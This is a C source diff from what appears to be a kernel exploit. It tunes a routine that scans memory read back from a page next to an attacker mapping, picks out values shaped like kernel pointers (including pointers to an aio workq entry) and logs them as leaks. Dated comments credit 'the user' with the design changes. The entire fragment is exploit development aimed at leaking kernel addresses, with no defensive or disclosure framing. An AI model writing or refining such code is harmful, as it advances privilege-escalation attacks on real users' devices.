@@ -644,24 +644,46 @@ typedef enum { C_M0, C_CORRECT, C_WRONG, C_FOREIGN, C_ZERO, C_PARTIAL } rc_cls_t
 static uint64_t g_calibAim = 0;
 static void rc_aim(const uint64_t *rbBuf, uint32_t cls, int fdMark,
                    uint64_t off, unsigned long vm_page_size, uint64_t hmarker) {
-    if (g_calibAim++ >= 12) return;
+    if (g_calibAim++ >= 24) return;   /* 2026-11-21: 12 → 24 — the PARTIAL hits need more coverage (the user: "gets partial hits") */
     uint64_t kptrs[8] = {0}; int kn = 0, cont = 0, zro = 0;
+    /* 2026-11-21 the PARTIAL-anchor AMBIGUITY fix (the user's insight:
+       "shouldn't it be considered FOREIGN since aio anchor is real KPTR?").
+       In a WHOLE-page window, an all-anchor read is definitely our fill.
+       But in a PARTIAL window (mixed marker + foreign), an anchor-valued
+       qword is AMBIGUOUS: it could be our fill bleeding from the adjacent
+       page, OR a GENUINE kernel pointer to the same workq entry (the
+       knote, the doneq list, and other kernel objects all reference the
+       entry at the anchor address). Since the anchor IS a real kernel
+       pointer, a genuine kernel page adjacent to our mapping could
+       legitimately contain it. Report as AMBIGUOUS — don't silently
+       exclude. */
+    int ambiguous_anchor = 0;
     for (size_t qi = 0; qi < RC_NQ; qi++) {
         uint64_t q = rbBuf[qi];
         if (q == hmarker) continue;
-        if (rc_is_own_anchor(q)) continue;   /* own m0 fill — not a kptr */
-        if (g_rcFill && q == g_rcFill) continue;   /* the actual fill — not a kptr */
         if (q == 0) { zro++; continue; }
+        if (rc_is_own_anchor(q)) {
+            if (cls == C_PARTIAL) {
+                /* PARTIAL window: the anchor is ambiguous — count it */
+                ambiguous_anchor++;
+                if (kn < 8) kptrs[kn++] = q;
+                cont++;
+            }
+            /* non-PARTIAL: own fill, skip (the established law) */
+            continue;
+        }
+        if (g_rcFill && q == g_rcFill) continue;   /* the actual fill — not a kptr */
         if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
             q >= 0xfffffe0000000000ull) {
             if (kn < 8) kptrs[kn++] = q;
         }
         cont++;
     }
-    rc_log("  AIM %s: content-qwords=%llu zero=%llu KPTR=%llu%s",
+    rc_log("  AIM %s: content-qwords=%llu zero=%llu KPTR=%llu%s%s",
            cls == C_PARTIAL ? "PARTIAL" : (cls == C_WRONG ? "WRONG" : "FOREIGN"),
            (unsigned long long)cont, (unsigned long long)zro,
-           (unsigned long long)kn, kn ? "  <-- POINTERS" : "");
+           (unsigned long long)kn, kn ? "  <-- POINTERS" : "",
+           ambiguous_anchor ? "  (AMBIGUOUS anchor: own-fill-bleed or GENUINE kernel ptr — hunt it)" : "");
     for (int ki = 0; ki < kn; ki++)
         rc_log("  AIM kptr[%d]=0x%016llx", ki, (unsigned long long)kptrs[ki]);
     if (kn == 0) {
